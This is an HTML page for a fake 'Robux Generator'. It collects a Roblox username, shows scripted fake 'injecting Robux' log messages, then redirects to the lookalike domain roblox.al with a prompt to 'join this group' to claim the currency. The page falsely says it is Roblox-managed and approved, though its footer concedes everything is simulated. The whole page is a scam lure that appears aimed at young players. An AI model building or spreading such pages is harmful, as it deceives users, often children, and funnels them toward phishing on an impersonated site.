<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>Robux Generator</title>

<style>
    body {
        background: #0d1117;
        color: white;
        font-family: Arial, sans-serif;
        text-align: center;
        padding: 0;
        margin: 0;
    }

    header {
        padding: 25px;
        font-size: 2.5rem;
        font-weight: bold;
        background: #11161d;
        border-bottom: 2px solid #00d447;
    }

    .box {
        background: #161b22;
        width: 400px;
        padding: 25px;
        margin: 40px auto;
        border-radius: 12px;
        box-shadow: 0px 0px 15px rgba(0,255,100,0.3);
    }

    input, select {
        padding: 12px;
        width: 90%;
        border-radius: 8px;
        border: none;
        margin-bottom: 15px;
    }

    #generate-btn {
        padding: 15px;
        width: 95%;
        font-size: 1.2rem;
        background: #00e053;
        border: none;
        border-radius: 10px;
        cursor: pointer;
        color: black;
        transition: 0.2s;
        font-weight: bold;
    }

    #generate-btn:hover {
        transform: scale(1.05);
        background: #00ff63;
    }

    #console-box {
        background: #0f1318;
        margin-top: 20px;
        height: 160px;
        overflow-y: auto;
        font-size: 0.9rem;
        padding: 10px;
        border-radius: 8px;
        text-align: left;
        display: none;
        border: 1px solid #00ff4c;
    }

    .footer {
        margin-top: 40px;
        font-size: 1rem;
        opacity: 0.7;
    }

    .prank {
        margin-top: 10px;
        font-size: 1rem;
        color: #ffeb3b;
        font-weight: bold;
    }
</style>
</head>

<body>

<header>Robux Generator</header>

<div class="box">
    <h2>Enter Roblox Username</h2>

    <input type="text" id="user" placeholder="Roblox Username">

    <h3>Select Robux Amount</h3>
    <select id="amount">
        <option value="1000">1,000 Robux</option>
        <option value="5000">5,000 Robux</option>
        <option value="10000">10,000 Robux</option>
        <option value="50000">50,000 Robux</option>
    </select>

    <button id="generate-btn">Generate Robux</button>

    <div id="console-box"></div>
</div>

<p class="footer">All processes shown are simulated.</p>
<p class="prank">THIS IS A  ROBLOX MANAGED WEBSITE.APPROVED</p>

<script>
const btn = document.getElementById("generate-btn");
const consoleBox = document.getElementById("console-box");

btn.addEventListener("click", () => {
    let user = document.getElementById("user").value.trim();
    let amount = document.getElementById("amount").value;

    if (!user) {
        alert("Please enter a Roblox username.");
        return;
    }

    consoleBox.style.display = "block";
    consoleBox.innerHTML = "";

    const logs = [
        "Connecting to Roblox servers...",
        "Establishing secure session...",
        "Fetching user profile: " + user + "...",
        "Checking account status...",
        "Injecting " + amount + " Robux...",
        "Finishing process...",
        "Success! Preparing claim method..."
    ];

    let index = 0;

    let interval = setInterval(() => {
        if (index < logs.length) {
            consoleBox.innerHTML += logs[index] + "<br>";
            consoleBox.scrollTop = consoleBox.scrollHeight;
            index++;
        } else {
            clearInterval(interval);

            setTimeout(() => {
                alert("To claim your Robux, you must join this group.");
                window.location.href = "https://roblox.al/communities/6743910039/";
            }, 800);
        }
    }, 900);
});
</script>

</body>
</html>
